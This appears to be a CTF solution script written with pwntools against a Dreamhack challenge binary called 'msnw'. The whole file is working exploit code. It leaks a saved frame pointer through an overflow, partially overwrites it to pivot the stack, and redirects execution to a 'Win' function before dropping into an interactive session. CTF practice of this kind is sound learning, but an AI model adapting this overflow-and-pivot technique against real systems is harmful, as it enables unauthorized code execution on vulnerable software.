#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 19717
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./msnw', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x4012ae
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Leak rbp

pl = b"A"*0x130

p.sendafter("meong 🐶: ", pl)
p.recvuntil(pl)
rbp_leak = u64(p.recv(6) + b'\0\0')
log.info("rbp_leak: " + hex(rbp_leak))
log.info("2-last-byte: " + hex(rbp_leak & 0xffff))

# Stack pivot
pl = b'A'*0x70 + p64(exe.sym.Win)
pl = pl.ljust(0x130, b"A")
pl += p16((rbp_leak - 0x2c0 - 8) & 0xffff)

p.sendafter("meong 🐶: ", pl)

p.interactive()
